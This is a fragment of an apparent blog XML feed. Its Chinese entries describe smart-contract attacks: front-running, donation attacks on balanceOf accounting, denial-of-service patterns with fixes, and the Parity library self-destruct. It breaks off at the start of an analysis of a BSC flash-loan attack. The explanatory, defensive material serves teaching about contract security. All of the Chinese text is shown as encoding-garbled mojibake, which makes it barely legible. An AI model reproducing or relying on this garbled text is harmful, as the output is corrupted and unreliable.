        <content type="html"><![CDATA[<h2 id="æŠ¢å…ˆäº¤æ˜“æ”»å‡»"><a href="#æŠ¢å…ˆäº¤æ˜“æ”»å‡»" class="headerlink" title="æŠ¢å…ˆäº¤æ˜“æ”»å‡»"></a>æŠ¢å…ˆäº¤æ˜“æ”»å‡»</h2><h3 id="äº¤æ˜“æŠ¢è·‘"><a href="#äº¤æ˜“æŠ¢è·‘" class="headerlink" title="äº¤æ˜“æŠ¢è·‘"></a>äº¤æ˜“æŠ¢è·‘</h3><h4 id="æ¼æ´æè¿°ï¼š"><a href="#æ¼æ´æè¿°ï¼š" class="headerlink" title="æ¼æ´æè¿°ï¼š"></a>æ¼æ´æè¿°ï¼š</h4><p>äº¤æ˜“æŠ¢è·‘æ˜¯æŒ‡æ”»å‡»è€…åœ¨çœ‹åˆ°æŸä¸ªäº¤æ˜“å³å°†è¢«çŸ¿å·¥æ‰“åŒ…åˆ°åŒºå—ä¸­æ—¶ï¼Œé€šè¿‡æé«˜gasè´¹è¿…é€Ÿæäº¤è‡ªå·±çš„äº¤æ˜“ï¼Œä½¿å…¶åœ¨åŸäº¤æ˜“ä¹‹å‰è¢«æ‰“åŒ…ã€‚</p><h4 id="ä¸¾ä¾‹ï¼š"><a href="#ä¸¾ä¾‹ï¼š" class="headerlink" title="ä¸¾ä¾‹ï¼š"></a>ä¸¾ä¾‹ï¼š</h4><p>1.ç”¨æˆ·åœ¨å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼ˆå¦‚Uniswapï¼‰ä¸Šæäº¤ä¸€ç¬”äº¤æ˜“ï¼Œå¸Œæœ›ä»¥è¾ƒä½ä»·æ ¼è´­ä¹°æŸç§ä»£å¸ã€‚<br>2.æ”»å‡»è€…çœ‹åˆ°è¿™ä¸€äº¤æ˜“åï¼Œç«‹å³æäº¤ä¸€ç¬”ç›¸åŒçš„äº¤æ˜“ï¼Œä½†è®¾ç½®æ›´é«˜çš„äº¤æ˜“è´¹ç”¨ï¼ˆgas priceï¼‰ï¼Œä½¿å…¶äº¤æ˜“ä¼˜å…ˆè¢«å¤„ç†ã€‚<br>3.ç»“æœï¼Œæ”»å‡»è€…ä»¥è¾ƒä½ä»·æ ¼è·å¾—ä»£å¸ï¼Œéšåå†ä»¥é«˜ä»·å‡ºå”®ï¼Œè·å–åˆ©æ¶¦ã€‚</p><h3 id="ä»·æ ¼æŠ¢è·‘"><a href="#ä»·æ ¼æŠ¢è·‘" class="headerlink" title="ä»·æ ¼æŠ¢è·‘"></a>ä»·æ ¼æŠ¢è·‘</h3><h4 id="æ¼æ´æè¿°ï¼š-1"><a href="#æ¼æ´æè¿°ï¼š-1" class="headerlink" title="æ¼æ´æè¿°ï¼š"></a>æ¼æ´æè¿°ï¼š</h4><p>ä»·æ ¼æŠ¢è·‘å‘ç”Ÿåœ¨ç”¨æˆ·çš„äº¤æ˜“å½±å“äº†æŸä¸ªèµ„äº§çš„ä»·æ ¼ï¼Œè€Œæ”»å‡»è€…åœ¨ä»·æ ¼å˜åŠ¨å‰è¿…é€Ÿæäº¤äº¤æ˜“ï¼Œä»ä¸­è·åˆ©ã€‚<br>ä¸¾ä¾‹ï¼š<br>1.åœ¨æŸä¸ªæ‹å–åˆçº¦ä¸­ï¼Œç”¨æˆ·æäº¤äº†ä¸€ä¸ªå‡ºä»·ï¼Œå¯¼è‡´ä»·æ ¼ä¸Šæ¶¨ã€‚<br>2.æ”»å‡»è€…æ³¨æ„åˆ°è¿™ä¸€å˜åŒ–ï¼Œå¹¶åœ¨ç”¨æˆ·å‡ºä»·è¢«ç¡®è®¤ä¹‹å‰ï¼Œæäº¤è‡ªå·±çš„å‡ºä»·ã€‚<br>3.æ”»å‡»è€…ä»¥æ›´ä½çš„ä»·æ ¼èµ¢å¾—æ‹å–ï¼Œè·å–èµ„äº§ã€‚</p><h3 id="çŠ¶æ€æŠ¢è·‘"><a href="#çŠ¶æ€æŠ¢è·‘" class="headerlink" title="çŠ¶æ€æŠ¢è·‘"></a>çŠ¶æ€æŠ¢è·‘</h3><h4 id="æ¼æ´æè¿°ï¼š-2"><a href="#æ¼æ´æè¿°ï¼š-2" class="headerlink" title="æ¼æ´æè¿°ï¼š"></a>æ¼æ´æè¿°ï¼š</h4><p>çŠ¶æ€æŠ¢è·‘æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡è§‚å¯Ÿåˆçº¦çš„çŠ¶æ€å˜åŒ–ï¼Œåˆ©ç”¨è¿™äº›ä¿¡æ¯è¿›è¡Œæœ‰åˆ©çš„äº¤æ˜“ã€‚<br>ä¸¾ä¾‹ï¼š<br>1.ä¸€ä¸ªåˆçº¦çš„çŠ¶æ€æ›´æ–°ä¸ºå¯ä»¥æå–å¥–åŠ±ï¼Œç”¨æˆ·æå–å‰ï¼Œæ”»å‡»è€…ç›‘æµ‹åˆ°è¿™ä¸ªçŠ¶æ€å˜åŒ–ï¼Œç«‹å³æäº¤æå–è¯·æ±‚ã€‚<br>2.è¿™æ ·ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·æå–å¥–åŠ±ä¹‹å‰è·å–æ›´å¤šçš„å¥–åŠ±ã€‚</p><h3 id="äº¤æ˜“æ’é˜Ÿ"><a href="#äº¤æ˜“æ’é˜Ÿ" class="headerlink" title="äº¤æ˜“æ’é˜Ÿ"></a>äº¤æ˜“æ’é˜Ÿ</h3><h4 id="æ¼æ´æè¿°ï¼š-3"><a href="#æ¼æ´æè¿°ï¼š-3" class="headerlink" title="æ¼æ´æè¿°ï¼š"></a>æ¼æ´æè¿°ï¼š</h4><p>äº¤æ˜“æ’é˜Ÿæ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡æäº¤å¤šä¸ªäº¤æ˜“ï¼Œè¿«ä½¿ç”¨æˆ·çš„äº¤æ˜“åœ¨åç»­äº¤æ˜“ä¸­å¤±æ•ˆï¼Œæˆ–è€…é€šè¿‡æ›´é«˜çš„äº¤æ˜“è´¹ç”¨å°†ç”¨æˆ·çš„äº¤æ˜“æŒ¤å‡ºåŒºå—ã€‚</p><h4 id="ä¸¾ä¾‹ï¼š-1"><a href="#ä¸¾ä¾‹ï¼š-1" class="headerlink" title="ä¸¾ä¾‹ï¼š"></a>ä¸¾ä¾‹ï¼š</h4><p>ç”¨æˆ·æäº¤äº†ä¸€ç¬”é‡è¦çš„äº¤æ˜“ï¼Œæ”»å‡»è€…æ•…æ„åœ¨ç”¨æˆ·äº¤æ˜“ä¹‹å‰å‘é€å¤šç¬”ä½ä»·å€¼äº¤æ˜“ï¼Œæé«˜ç½‘ç»œæ‹¥å µï¼Œä½¿ç”¨æˆ·çš„äº¤æ˜“éš¾ä»¥è¢«æ‰“åŒ…ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ”»å‡»æè¿° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ææ¬¾æ”»å‡»</title>
      <link href="/2024/10/07/%E6%8D%90%E6%AC%BE%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/07/%E6%8D%90%E6%AC%BE%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="ææ¬¾æ”»å‡»"><a href="#ææ¬¾æ”»å‡»" class="headerlink" title="ææ¬¾æ”»å‡»"></a>ææ¬¾æ”»å‡»</h2><h3 id="è¯¥åè®®æ˜¯å¦ä¾èµ–äºbalanceæˆ–è€…balanceofï¼Œè€Œä¸æ˜¯å†…éƒ¨ä¼šè®¡"><a href="#è¯¥åè®®æ˜¯å¦ä¾èµ–äºbalanceæˆ–è€…balanceofï¼Œè€Œä¸æ˜¯å†…éƒ¨ä¼šè®¡" class="headerlink" title="è¯¥åè®®æ˜¯å¦ä¾èµ–äºbalanceæˆ–è€…balanceofï¼Œè€Œä¸æ˜¯å†…éƒ¨ä¼šè®¡"></a>è¯¥åè®®æ˜¯å¦ä¾èµ–äºbalanceæˆ–è€…balanceofï¼Œè€Œä¸æ˜¯å†…éƒ¨ä¼šè®¡</h3><h4 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h4><p>   åœ¨ä»¥å¤ªåŠç½‘ç»œä¸Šï¼Œä»»ä½•åœ°å€çš„ä½™é¢ï¼ˆæ— è®ºæ˜¯ä»¥å¤ªå¸è¿˜æ˜¯ä»£å¸ï¼‰éƒ½å¯ä»¥é€šè¿‡address(this).balance æˆ–token.balanceof(address)æŸ¥è¯¢ã€‚ç„¶è€Œï¼Œå¤–éƒ¨è´¦æˆ·çš„ä½™é¢å¯ä»¥è¢«å¤–éƒ¨æ“ä½œï¼ˆå¦‚å…¶ä»–åˆçº¦è°ƒç”¨ã€ç”¨æˆ·è½¬è´¦ç­‰ï¼‰å½±å“ã€‚ä¾èµ–äºå¤–éƒ¨çŠ¶æ€ï¼ˆå³ä½™é¢ï¼‰å¯èƒ½å¯¼è‡´åˆçº¦çš„å†…éƒ¨é€»è¾‘å¤±å»ä¸€è‡´æ€§ï¼Œå› ä¸ºå¤–éƒ¨è´¦æˆ·çš„çŠ¶æ€åœ¨åˆçº¦è¿è¡ŒæœŸé—´æ˜¯ä¸å¯é¢„æµ‹çš„ã€‚</p><h4 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><p>   é¦–ä½å­˜æ¬¾äººå¯ä»¥ä¸­æ–­è‚¡ä»½çš„é”»é€ ï¼Œå¦‚æœæ€»èµ„äº§é€šè¿‡å¤§é‡ææ¬¾è¢«æ“çºµï¼Œç”¨æˆ·å¯èƒ½æ— æ³•è·å¾—å…¶å­˜æ¬¾çš„è‚¡ä»½ï¼Œæ”»å‡»è€…æ“çºµä¾èµ–äºbalanceofç¡®å®šæ€»èµ„äº§é‡‘é¢å¹¶é˜»æ­¢å…¶ä»–ç”¨æˆ·é€šè¿‡å­˜æ¬¾æ¢å–è‚¡ä»½</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ”»å‡»æè¿° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDOSï¼‰</title>
      <link href="/2024/10/06/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DOS%EF%BC%89/"/>
      <url>/2024/10/06/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DOS%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="æ‹’ç»æœåŠ¡ï¼ˆDOSï¼‰æ”»å‡»"><a href="#æ‹’ç»æœåŠ¡ï¼ˆDOSï¼‰æ”»å‡»" class="headerlink" title="æ‹’ç»æœåŠ¡ï¼ˆDOSï¼‰æ”»å‡»"></a>æ‹’ç»æœåŠ¡ï¼ˆDOSï¼‰æ”»å‡»</h3><h3 id="æœªè®¾å®šgasè´¹ç‡çš„å¤–éƒ¨è°ƒç”¨"><a href="#æœªè®¾å®šgasè´¹ç‡çš„å¤–éƒ¨è°ƒç”¨" class="headerlink" title="æœªè®¾å®šgasè´¹ç‡çš„å¤–éƒ¨è°ƒç”¨"></a>æœªè®¾å®šgasè´¹ç‡çš„å¤–éƒ¨è°ƒç”¨</h3><p> åœ¨ä»¥å¤ªåŠä¸­ï¼Œæ¯ä¸€ç¬”äº¤æ˜“éƒ½ä¼šæºå¸¦ä¸€å®šæ•°é‡çš„Gasï¼Œè¿™æ˜¯ä¸ºäº†ç¡®ä¿ä»»ä½•æ‰§è¡Œçš„æ“ä½œéƒ½ä¸ä¼šæ¶ˆè€—è¿‡å¤šçš„è®¡ç®—èµ„æºï¼Œä»è€Œé¿å…ç½‘ç»œæ‹¥å µæˆ–èµ„æºè€—å°½ã€‚å½“ä¸€ç¬”äº¤æ˜“å¼€å§‹æ‰§è¡Œæ—¶ï¼Œå®ƒä¼šä»äº¤æ˜“è€…æä¾›çš„Gasæ€»é‡ä¸­æ‰£é™¤è´¹ç”¨ï¼Œç›´åˆ°åˆçº¦æ‰§è¡Œå®Œæˆæˆ–Gasè€—å°½ã€‚å¦‚æœåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­Gasè€—å°½ï¼Œé‚£ä¹ˆäº¤æ˜“å°†è¢«å›æ»šï¼Œä¸”å·²ç»æ¶ˆè€—çš„Gasä¸ä¼šé€€è¿˜ç»™ç”¨æˆ·ã€‚</p><h4 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h4><p>   1ï¼Œ æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ é«˜å¤æ‚åº¦çš„äº¤æ˜“æˆ–æ™ºèƒ½åˆçº¦æ¥æ•…æ„æ¶ˆè€—å¤§é‡çš„Gasï¼Œä»è€Œæ­£å¸¸äº¤æ˜“æ— æ³•è¢«åŒ…å«åœ¨åŒºå—ä¸­ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªåˆçº¦ï¼Œè¯¥åˆçº¦åœ¨æ¥æ”¶åˆ°æ¶ˆæ¯æ—¶æ‰§è¡Œå¤§é‡è®¡ç®—æˆ–å­˜å‚¨æ“ä½œï¼Œæ¶ˆè€—æ¥è¿‘æœ€å¤§Gasé™é¢çš„Gasé‡ã€‚å½“è®¸å¤šè¿™æ ·çš„äº¤æ˜“è¢«åŒæ—¶å‘é€åˆ°ç½‘ç»œæ—¶ï¼Œå®ƒä»¬ä¼šå æ®å¤§éƒ¨åˆ†ç”šè‡³å…¨éƒ¨çš„Gaså®¹é‡ï¼Œå¯¼è‡´å…¶ä»–ç”¨æˆ·çš„æ­£å¸¸äº¤æ˜“æ— æ³•è¢«ç¡®è®¤ï¼Œä»è€Œè¾¾åˆ°æ‹’ç»æœåŠ¡çš„æ•ˆæœã€‚<br>   2ï¼Œä½¿æ™ºèƒ½åˆçº¦è¿›å…¥æ— é™å¾ªç¯ï¼Œè¿™å°†å¯¼è‡´Gasç«‹å³è€—å°½ï¼Œäº¤æ˜“å¤±è´¥å¹¶å›æ»šã€‚è¿™ç§æ”»å‡»é€šå¸¸å‘ç”Ÿåœ¨åˆçº¦é€»è¾‘ä¸­å­˜åœ¨é”™è¯¯çš„æƒ…å†µä¸‹ï¼Œä¾‹å¦‚æ²¡æœ‰æ­£ç¡®å¤„ç†å¾ªç¯é€€å‡ºæ¡ä»¶ï¼Œæˆ–åœ¨é€’å½’è°ƒç”¨ä¸­ç¼ºå°‘ç»ˆæ­¢æ¡ä»¶ã€‚å½“åˆçº¦è¿›å…¥æ— é™å¾ªç¯æ—¶ï¼Œå®ƒä¼šå°è¯•æ¶ˆè€—æ‰€æœ‰å¯ç”¨çš„Gasï¼Œæœ€ç»ˆå¯¼è‡´äº¤æ˜“å¤±è´¥ï¼Œå¹¶å¯èƒ½ä½¿åˆçº¦å¤„äºä¸å¯ç”¨çŠ¶æ€ã€‚</p><h4 id="è§£å†³æ–¹æ³•ï¼š"><a href="#è§£å†³æ–¹æ³•ï¼š" class="headerlink" title="è§£å†³æ–¹æ³•ï¼š"></a>è§£å†³æ–¹æ³•ï¼š</h4><p>   ä½¿ç”¨callå‡½æ•°æ—¶å¯ä»¥è°ƒè¯•å‡ºæ‰§è¡Œæ“ä½œéœ€è¦çš„å¤§è‡´gasè´¹ç‡ï¼Œåœ¨callå‡½æ•°æŒ‡å®šç¨å¤§ä¸€äº›è´¹ç‡ï¼Œé¿å…æ”»å‡»å‘ç”Ÿã€‚</p><h3 id="ä¾èµ–å¤–éƒ¨çš„è°ƒç”¨è¿›å±•"><a href="#ä¾èµ–å¤–éƒ¨çš„è°ƒç”¨è¿›å±•" class="headerlink" title="ä¾èµ–å¤–éƒ¨çš„è°ƒç”¨è¿›å±•"></a>ä¾èµ–å¤–éƒ¨çš„è°ƒç”¨è¿›å±•</h3><h4 id="æ¼æ´åˆ†æï¼š-1"><a href="#æ¼æ´åˆ†æï¼š-1" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h4><pre><code>è¿™ç§æƒ…å†µæ˜¯ç”±äºåˆçº¦æ²¡æœ‰æ­£ç¡®å¤„ç†å¤–éƒ¨è°ƒç”¨ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåˆçº¦ä¾èµ–äºå¤–éƒ¨å‡½æ•°æ‰§è¡Œçš„ç»“æœï¼Œä½†åˆçº¦æ²¡æœ‰å¯¹å¤–éƒ¨å‡½æ•°æ‰§è¡Œå¤±è´¥è¿›è¡Œå¤„ç†ï¼Œæ­¤æ—¶å¦‚æœå¤–éƒ¨è°ƒç”¨å¤±è´¥æˆ–è€…ç”±äºå¤–éƒ¨åŸå› è€Œè¢«æ‹’ç»æ—¶ï¼Œä¼šå¯¼è‡´æ¯æ¬¡æ‰§è¡Œäº¤æ˜“æ—¶éƒ½ä¼šå› ä¸ºè¿™ä¸ªå¤±è´¥é—®é¢˜å¯¼è‡´äº¤æ˜“å›æ»šï¼Œåˆçº¦æ— æ³•ç»§ç»­æ‰§è¡Œã€‚</code></pre><h4 id="ä¸¾ä¾‹ï¼š"><a href="#ä¸¾ä¾‹ï¼š" class="headerlink" title="ä¸¾ä¾‹ï¼š"></a>ä¸¾ä¾‹ï¼š</h4><p>   åœ¨ç«æ‹åˆçº¦ä¸­ï¼Œå‡ºä»·è€…é«˜æˆä¸ºkingï¼Œå¹¶æŠŠä¸Šä¸€ä½kingçš„é’±transferå›å»ï¼Œä½†æ˜¯å¦‚æœä¸Šä¸€ä½kingå¹¶ä¸èƒ½æ¥å—é’±çš„è¯,é‚£ä¹ˆä»–å°±ä¼šä¸€ç›´æˆä¸ºkingï¼Œå°±ç›¸å½“äºæ‹’ç»å…¶ä»–äººçš„å‡ºé«˜ä»·ç«æ‹</p><h4 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h4><p>   åœ¨ç«æ‹åˆçº¦ä¸­å°½é‡è®©åˆçº¦å‚ä¸è€…è‡ªæå‚ä¸ç«æ‹çš„tokenï¼Œå…¶æ¬¡å¦‚æœç¡®å®éœ€è¦å¯¹å¤–éƒ¨å‡½æ•°è°ƒç”¨çš„ç»“æœè¿›è¡Œå¤„ç†æ‰èƒ½è¿›å…¥æ–°çš„çŠ¶æ€ï¼Œè¯·è€ƒè™‘å¤–éƒ¨è°ƒç”¨å¯èƒ½ä¸€ç›´å¤±è´¥çš„æƒ…å†µï¼Œä¹Ÿå¯ä»¥æ·»åŠ åŸºäºæ—¶é—´çš„æ“ä½œï¼Œé˜²æ­¢å¤–éƒ¨å‡½æ•°è°ƒç”¨ä¸€ç›´æ— æ³•æ»¡è¶³requireåˆ¤æ–­ã€‚</p><h3 id="Ownerçš„é”™è¯¯æ“ä½œ"><a href="#Ownerçš„é”™è¯¯æ“ä½œ" class="headerlink" title="Ownerçš„é”™è¯¯æ“ä½œ"></a>Ownerçš„é”™è¯¯æ“ä½œ</h3><h4 id="æ¼æ´åˆ†æï¼š-2"><a href="#æ¼æ´åˆ†æï¼š-2" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h4><p>   è¿™ç§æ‹’ç»æœåŠ¡æ”»å‡»å°±æ˜¯å»ºç«‹åœ¨åæœŸè¿è¥æƒ…å†µä¸‹ï¼Œåœ¨æ™ºèƒ½åˆçº¦ä¸­é€šå¸¸ä¼šå­˜åœ¨ä»¥ Owner è´¦æˆ·ä½œä¸ºç®¡ç†å‘˜è§’è‰²ï¼Œè¯¥è§’è‰²é€šå¸¸ä¼šæŒæœ‰å¾ˆé«˜çš„æƒé™ï¼Œä¾‹å¦‚å¼€å¯æˆ–æš‚åœè½¬è´¦åŠŸèƒ½ï¼Œå½“ Owner è§’è‰²æ“ä½œå¤±è¯¯æˆ–ç§é’¥ä¸¢å¤±å¯èƒ½ä¼šå—åˆ°éä¸»è§‚æ„ä¹‰ä¸Šçš„æ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p><h4 id="è§£å†³æ–¹æ³•ï¼š-1"><a href="#è§£å†³æ–¹æ³•ï¼š-1" class="headerlink" title="è§£å†³æ–¹æ³•ï¼š"></a>è§£å†³æ–¹æ³•ï¼š</h4><p>   å»ºè®®è®¾è®¡å¤šä¸ªowneråœ°å€ï¼Œé¿å…å¯†é’¥é—å¤±ç­‰é—®é¢˜å‘ç”Ÿæ—¶ï¼Œå¯¼è‡´åˆçº¦è¢«é”ï¼ŒåŒæ—¶ä¸€ä¸ªç»¼åˆç³»ç»Ÿä¸­åªæœ‰ä¸€ä¸ªç»å¯¹æƒé™çš„ç®¡ç†å‘˜æ˜¯æå…¶ä¸å®‰å…¨çš„ã€‚</p><h3 id="æ•°ç»„æˆ–æ˜ å°„è¿‡é•¿"><a href="#æ•°ç»„æˆ–æ˜ å°„è¿‡é•¿" class="headerlink" title="æ•°ç»„æˆ–æ˜ å°„è¿‡é•¿"></a>æ•°ç»„æˆ–æ˜ å°„è¿‡é•¿</h3><h4 id="æ¼æ´åˆ†æï¼š-3"><a href="#æ¼æ´åˆ†æï¼š-3" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h4><pre><code>å½“åˆçº¦ä¸­å­˜åœ¨å¯¹ä¼ å…¥çš„æ˜ å°„æˆ–æ•°ç»„å¾ªç¯éå†çš„é€»è¾‘ä¸”æ²¡æœ‰é™åˆ¶ä¼ å…¥çš„æ˜ å°„æˆ–æ•°ç»„çš„é•¿åº¦æ—¶æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¼ å…¥è¶…é•¿çš„æ˜ å°„æˆ–è€…æ•°ç»„è¿›è¡Œå¾ªç¯éå†è€Œå¤§é‡æ¶ˆè€— Gas ä»è€Œè¯¥ç¬”äº¤æ˜“çš„ Gas æº¢å‡ºï¼Œæœ€åä½¿å¾—æ™ºèƒ½åˆçº¦æš‚æ—¶æˆ–æ°¸ä¹…ä¸å¯æ“ä½œã€‚</code></pre><h4 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><p>  åœ¨åˆ©ç›Šåˆ†å‘åˆçº¦ä¸­ï¼Œç±»ä¼¼äºå…¬å¸ç»™è‚¡ä¸œåˆ†çº¢ï¼Œå¦‚æœå‘˜å·¥äººæ•°è¿‡äºå¤šï¼Œå³æ•°ç»„è¿‡å¤§ä¼šå¯¼è‡´æ“ä½œæ‰§è¡Œçš„gasè¿œè¿œè¶…äºä¸Šé™ï¼Œä»è€Œå¯¼è‡´äº¤æ˜“å¤±è´¥ï¼Œä¹Ÿå°±æ— æ³•åˆ†çº¢</p><h4 id="è§£å†³æ–¹æ³•ï¼š-2"><a href="#è§£å†³æ–¹æ³•ï¼š-2" class="headerlink" title="è§£å†³æ–¹æ³•ï¼š"></a>è§£å†³æ–¹æ³•ï¼š</h4><p>   é¿å…éœ€è¦å¾ªç¯æ“ä½œçš„æ•°ç»„æˆ–æ˜ å°„èƒ½å¤Ÿè¢«å¤–éƒ¨è°ƒç”¨ï¼ŒåŒæ—¶åœ¨åˆç†çš„å¢é•¿è¿‡ç¨‹ï¼Œå¯ä»¥é‡‡ç”¨åˆ†åŒºå—å¤„ç†çš„æ–¹å¼ï¼Œé¿å…æ•°ç»„æˆ–æ˜ å°„è¿‡å¤§å¤±è´¥ã€‚</p><h3 id="ä¾èµ–åº“çš„é—®é¢˜"><a href="#ä¾èµ–åº“çš„é—®é¢˜" class="headerlink" title="ä¾èµ–åº“çš„é—®é¢˜"></a>ä¾èµ–åº“çš„é—®é¢˜</h3><h4 id="æ¼æ´åˆ†æï¼š-4"><a href="#æ¼æ´åˆ†æï¼š-4" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h4><p>   ä¾èµ–å¤–éƒ¨çš„åˆçº¦åº“ã€‚å¦‚æœå¤–éƒ¨åˆçº¦çš„åº“è¢«åˆ é™¤ï¼Œé‚£ä¹ˆæ‰€æœ‰ä¾èµ–åº“çš„åˆçº¦æœåŠ¡éƒ½æ— æ³•ä½¿ç”¨ã€‚æœ‰äº›åˆçº¦ç”¨äºæ¥å—etherï¼Œå¹¶è½¬è´¦ç»™å…¶ä»–åœ°å€ã€‚ä½†æ˜¯ï¼Œè¿™äº›åˆçº¦æœ¬èº«å¹¶æ²¡æœ‰è‡ªå·±å®ç°ä¸€ä¸ªè½¬è´¦å‡½æ•°ï¼Œè€Œæ˜¯é€šè¿‡delegatecallå»è°ƒç”¨ä¸€äº›å…¶ä»–åˆçº¦ä¸­çš„è½¬è´¦å‡½æ•°å»å®ç°è½¬è´¦çš„åŠŸèƒ½ã€‚ä¸‡ä¸€è¿™äº›æä¾›è½¬è´¦åŠŸèƒ½çš„åˆçº¦æ‰§è¡Œsuicideæˆ–self-destructæ“ä½œçš„è¯ï¼Œé‚£ä¹ˆï¼Œé€šè¿‡delegatecallè°ƒç”¨è½¬è´¦åŠŸèƒ½çš„åˆçº¦å°±æœ‰å¯èƒ½å‘ç”Ÿetherè¢«å†»ç»“çš„æƒ…å†µ</p><h4 id="ä¸¾ä¾‹-1"><a href="#ä¸¾ä¾‹-1" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><p>  Parity é’±åŒ…é­å—çš„ç¬¬äºŒæ¬¡æ”»å‡»æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚Parity é’±åŒ…æä¾›äº†å¤šç­¾é’±åŒ…çš„åº“åˆçº¦ã€‚å½“åº“åˆçº¦çš„å‡½æ•°è¢« delegatecall è°ƒç”¨æ—¶ï¼Œå®ƒæ˜¯è¿è¡Œåœ¨è°ƒç”¨æ–¹ï¼ˆå³ï¼šç”¨æˆ·å¤šç­¾åˆçº¦ï¼‰çš„ä¸Šä¸‹æ–‡é‡Œï¼Œåƒ m_numOwners è¿™æ ·çš„å˜é‡éƒ½æ¥è‡ªäºç”¨æˆ·å¤šç­¾åˆçº¦çš„ä¸Šä¸‹æ–‡ã€‚å¦å¤–ï¼Œä¸ºäº†èƒ½è¢«ç”¨æˆ·åˆçº¦è°ƒç”¨ï¼Œè¿™äº›åº“åˆçº¦çš„åˆå§‹åŒ–å‡½æ•°éƒ½æ˜¯publicçš„ã€‚æ”»å‡»è€…å°±è°ƒç”¨åˆå§‹åŒ–å‡½æ•°æŠŠè‡ªå·±è®¾ç½®ä¸ºåº“å‡½æ•°çš„ownerï¼Œåœ¨è°ƒç”¨killï¼ˆï¼‰å‡½æ•°ï¼ŒæŠŠåº“åˆçº¦åˆ é™¤ï¼Œæ‰€æœ‰çš„etherå°±è¢«å†»ç»“äº†</p><h4 id="è§£å†³æ–¹æ³•ï¼š-3"><a href="#è§£å†³æ–¹æ³•ï¼š-3" class="headerlink" title="è§£å†³æ–¹æ³•ï¼š"></a>è§£å†³æ–¹æ³•ï¼š</h4><p>  ç»§æ‰¿åº“åˆçº¦åï¼Œå¯¹äºå¯ä»¥æ”¹å˜æŒ‡æ™ºèƒ½åˆçº¦å­˜å‚¨çŠ¶æ€çš„å‡½æ•°ï¼Œå°½é‡é‡‡å–é‡å†™çš„æ–¹å¼ï¼Œé¿å…è¢«æ¶æ„è°ƒç”¨ã€‚ç‰¹åˆ«æ˜¯ownerä¿®é¥°è¯ï¼Œè½¬è´¦å‡½æ•°ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ”»å‡»æè¿° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20240508 BSCæ”»å‡»äº‹ä»¶åˆ†æ</title>
      <link href="/2024/09/29/20240508-BSC%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2024/09/29/20240508-BSC%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="BSCæ”»å‡»äº‹ä»¶åˆ†æ"><a href="#BSCæ”»å‡»äº‹ä»¶åˆ†æ" class="headerlink" title="BSCæ”»å‡»äº‹ä»¶åˆ†æ"></a>BSCæ”»å‡»äº‹ä»¶åˆ†æ</h2><p>è¿™æ˜¯ä¸€èµ·å‘ç”Ÿåœ¨2024å¹´5æœˆ8æ—¥å¸å®‰æ™ºèƒ½é“¾ï¼ˆBSCï¼‰ä¸Šçš„é—ªè´·æ”»å‡»äº‹ä»¶ï¼Œå½±å“çš„æ˜¯GPUä»£å¸åˆçº¦ã€‚è¯¥åˆçº¦å­˜åœ¨è‡ªè½¬è´¦æ¼æ´ï¼Œæ¯æ¬¡è‡ªè½¬è´¦éƒ½ä¼šå¯¼è‡´èµ„äº§ç¿»å€ã€‚é»‘å®¢åˆ©ç”¨è¯¥æ¼æ´ï¼Œé€šè¿‡DODOåè®®ä»¥é—ªè´·çš„æ–¹å¼å€Ÿå…¥BUSDï¼Œåœ¨PancakeSwapä¸Šå…‘æ¢æˆGPUä»£å¸ï¼Œå†åˆ©ç”¨æ¼æ´è¿›è¡Œå¤šæ¬¡è‡ªè½¬è´¦ï¼Œå¯¼è‡´å…¶GPUä»£å¸ä½™é¢å¢åŠ 